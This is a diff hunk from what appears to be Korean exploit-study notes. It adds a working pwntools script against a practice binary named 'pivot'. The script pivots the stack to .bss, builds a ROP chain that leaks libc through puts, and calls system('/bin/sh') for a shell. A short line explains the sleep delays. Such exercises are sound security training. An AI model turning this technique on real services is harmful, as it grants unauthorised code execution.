@@ -500,8 +500,44 @@ int main(void)
 
 - 익스플로잇
 ```python
+from pwn import *
+from time import *
 
+p = process('./pivot')
+e = ELF('./pivot')
+l = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+ret = 0x40101a
+pop_rdi = 0x4011e5
+pop_rsi_r15 = 0x4011e7
+pop_rdx = 0x4011eb
+leave_ret = 0x40127b
+bss = e.bss() + 0x800
+
+payload = b'a' * 0x30 + p64(bss)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
+payload += p64(e.sym['read']) + p64(leave_ret)
+p.sendafter(b'laboratory.\n', payload)
+sleep(1)
+
+payload = p64(bss)
+payload += p64(pop_rdi) + p64(e.got['read']) + p64(e.sym['puts'])
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
+payload += p64(pop_rdx) + p64(0x100)
+payload += p64(e.sym['read']) + p64(leave_ret)
+p.send(payload)
+sleep(1)
+
+l.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - l.sym['read']
+binsh = list(l.search(b'/bin/sh'))[0]
+system = l.sym['system']
+payload = p64(bss) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
+p.send(payload)
+p.interactive()
 ```
+의도적으로 중간에 출력을 넣지 않는 이상, `sendafter`를 사용할 수 없기 때문에 `sleep(1)`을 추가해 `payload` 실행을 안정화하ㅣ다.
 
 ---
 ### Chapter 10
